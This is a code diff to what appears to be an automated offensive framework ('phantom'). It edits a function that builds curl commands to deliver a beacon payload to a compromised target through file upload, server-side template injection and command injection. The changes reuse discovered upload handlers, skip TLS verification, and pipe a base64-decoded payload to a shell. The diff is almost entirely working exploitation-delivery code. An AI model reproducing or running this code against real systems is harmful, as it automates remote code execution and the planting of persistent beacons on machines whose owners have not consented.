@@ -89,11 +89,26 @@ def _beacon_via_rce_adapter(wm, slots):
         with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tf:
             tf.write(payload)
             tmp = tf.name
+        from phantom.automation.guidance.kit import _web_scheme
         target = _effective_target(wm)
-        scheme = "https" if str(cand.get("port")) in ("443", "8443") else "http"
-        return (f"curl -m 25 -s -F 'file=@{tmp};filename=probe.py' "
-                f"{scheme}://{_hport(target, cand['port'])}/upload "
-                ">/dev/null && echo PHANTOM_RCE_DELIVERED")
+        port = str(cand.get("port") or "")
+        scheme = str(cand.get("scheme") or "").strip()
+        if not scheme:
+            try:
+                scheme = _web_scheme(wm, int(port)) if port else "http"
+            except (TypeError, ValueError):
+                scheme = "http"
+        # Re-use the exact upload handler that produced the RCE marker.
+        # Hardcoding /upload made a discovered handler (e.g.
+        # /internal/v2/report/run) unreachable at delivery time.
+        base = str(cand.get("url") or "")
+        if not base:
+            path = str(cand.get("path") or "/upload")
+            base = f"{scheme}://{_hport(target, port)}{path}"
+        # -k: the probe already accepted this target's self-signed TLS;
+        # the delivery upload must not die on certificate verification.
+        return (f"curl -k -m 25 -s -F 'file=@{tmp};filename=probe.py' "
+                f"{base} >/dev/null && echo PHANTOM_RCE_DELIVERED")
     if cand["channel"] == "ssti":
         import base64
         import urllib.parse
@@ -106,8 +121,10 @@ def _beacon_via_rce_adapter(wm, slots):
             r"\{\{.*?\}\}|\$\{.*?\}|\#\{.*?\}|<%=.*?%>",
             urllib.parse.quote(payload, safe=""),
             cand.get("endpoint") or "/")
+        from phantom.automation.guidance.kit import _web_scheme
         target = _effective_target(wm)
-        return (f"curl -m 25 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
+        scheme = _web_scheme(wm, int(cand.get("port") or 80))
+        return (f"curl -m 25 -s '{scheme}://{_hport(target, cand['port'])}{endpoint}' "
                 "-o /dev/null && echo PHANTOM_RCE_DELIVERED")
     if cand["channel"] == "cmdi":
         # confirmed command injection = the SHORTEST path to the beacon:
@@ -120,8 +137,10 @@ def _beacon_via_rce_adapter(wm, slots):
                                          f"echo {b64} | base64 -d | sh")
         if endpoint is None:
             raise ValueError("cmdi endpoint has no injectable GET parameter")
+        from phantom.automation.guidance.kit import _web_scheme
         target = _effective_target(wm)
-        return (f"curl -m 25 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
+        scheme = _web_scheme(wm, int(cand.get("port") or 80))
+        return (f"curl -m 25 -s '{scheme}://{_hport(target, cand['port'])}{endpoint}' "
                 "-o /dev/null && echo PHANTOM_RCE_DELIVERED")
     if cand["channel"] == "poc":
         # A local PoC already proved command execution against this exact
